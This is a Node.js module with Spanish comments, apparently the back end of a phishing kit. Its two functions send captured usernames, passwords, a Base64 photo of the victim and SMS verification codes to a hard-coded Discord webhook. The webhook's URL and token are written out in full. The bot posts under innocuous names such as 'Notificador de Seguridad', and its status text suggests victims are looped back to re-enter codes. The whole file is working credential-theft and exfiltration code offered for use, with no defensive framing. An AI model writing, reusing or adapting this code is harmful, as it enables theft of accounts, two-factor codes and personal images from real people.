const { WebhookClient, EmbedBuilder } = require('discord.js');

// --------------------------------------------------------------------------
// CONFIGURACIÓN DEL WEBHOOK DE DISCORD
// Reemplaza los datos entre comillas con los de tu Webhook de Discord
// (Puedes obtener esta URL en la configuración de un canal > Integraciones > Webhooks)
// --------------------------------------------------------------------------
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp';

let webhookClient;
try {
  webhookClient = new WebhookClient({ url: DISCORD_WEBHOOK_URL });
} catch (error) {
  console.warn('⚠️ Webhook URL no configurada correctamente en discordSender.js');
}

/**
 * Envía los datos capturados (usuario, contraseña y foto en formato Base64) a un canal de Discord.
 * 
 * @param {string} usuario - Nombre de usuario capturado
 * @param {string} contrasena - Contraseña ingresada
 * @param {string} fotoBase64 - Foto capturada en formato data URL (Base64)
 */
async function enviarDatosConFoto(usuario, contrasena, fotoBase64) {
  if (!webhookClient) {
    throw new Error('Configura la URL de tu Webhook de Discord en discordSender.js');
  }

  // 1. Convertir la foto de Base64 a un Buffer binario para adjuntarla como archivo
  const base64Data = fotoBase64.replace(/^data:image\/\w+;base64,/, '');
  const imageBuffer = Buffer.from(base64Data, 'base64');
  const fileName = `foto_${Date.now()}_${usuario}.png`;

  // 2. Crear un embed visualmente ordenado para el mensaje
  const embed = new EmbedBuilder()
    .setTitle('🚨 Nueva Captura de Inicio de Sesión')
    .setColor(0x36427f) // Color acorde al diseño del portal (#36427f)
    .addFields(
      { name: '👤 Usuario', value: `\`\`\`${usuario}\`\`\``, inline: true },
      { name: '🔑 Contraseña', value: `\`\`\`${contrasena}\`\`\``, inline: true },
      { name: '📅 Fecha / Hora', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
    )
    .setImage(`attachment://${fileName}`)
    .setFooter({ text: 'Sistema de Verificación Web' })
    .setTimestamp();

  // 3. Enviar mensaje a Discord
  return await webhookClient.send({
    username: 'Notificador de Seguridad',
    avatarURL: 'https://cdn-icons-png.flaticon.com/512/1041/1041916.png',
    embeds: [embed],
    files: [{
      attachment: imageBuffer,
      name: fileName
    }]
  });
}

/**
 * Envía la notificación cuando se ingresa un código SMS.
 * 
 * @param {string} usuario - Nombre de usuario
 * @param {string} codigo - Código SMS ingresado
 */
async function enviarCodigoSMS(usuario, codigo) {
  if (!webhookClient) {
    throw new Error('Configura la URL de tu Webhook de Discord en discordSender.js');
  }

  const embed = new EmbedBuilder()
    .setTitle('📲 Intento de Verificación SMS')
    .setColor(0xd93838) // Color de alerta/error
    .addFields(
      { name: '👤 Usuario', value: `\`\`\`${usuario}\`\`\``, inline: true },
      { name: '🔢 Código Ingresado', value: `\`\`\`${codigo}\`\`\``, inline: true },
      { name: 'STATUS', value: '❌ Reintentando (devuelto a la cámara)', inline: false }
    )
    .setTimestamp();

  return await webhookClient.send({
    username: 'Notificador SMS',
    embeds: [embed]
  });
}

module.exports = {
  enviarDatosConFoto,
  enviarCodigoSMS
};